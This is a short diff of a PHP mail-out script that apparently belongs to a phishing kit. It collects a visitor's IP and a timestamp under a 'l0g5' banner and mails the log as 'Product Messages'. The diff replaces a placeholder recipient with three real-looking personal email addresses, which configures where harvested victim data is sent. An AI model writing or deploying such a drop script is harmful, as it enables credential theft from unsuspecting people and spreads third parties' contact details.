@@ -8,7 +8,7 @@ $message .= "loc                     : ".$ip."\n";
 $dated = "The time is " . date("l jS \of F Y h:i:s A");
 $message .= "Date                   : ".$dated."\n"; 
 $message .= "------------------------ l0g5 -------------------\n"; 
-$send = "youremal@domain.com";
+$send = "kr1st0f3rz@proton.me, cvilla9910@outlook.com, cvilla9910@gmail.com";
 
 $subject = "Product Messages"; 
 $headers ="";  
